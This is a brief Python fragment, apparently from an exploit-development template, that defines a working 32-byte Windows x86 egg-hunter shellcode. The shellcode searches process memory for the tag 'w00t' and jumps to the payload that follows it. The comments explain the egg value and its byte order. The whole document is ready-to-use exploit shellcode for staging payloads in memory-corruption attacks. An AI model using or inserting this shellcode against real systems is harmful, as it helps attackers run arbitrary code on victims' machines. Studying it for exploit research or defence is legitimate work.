# Egg hunter ###################################################################
#
# In this example the egg value is "w00t". Remember that the value is read out
# little endian! As such the bytes required for "w00t" are: "\x77\x30\x30\x74"
#
egghunter =  b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter += b"\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
#                      | t   0   0   w |
################################################################################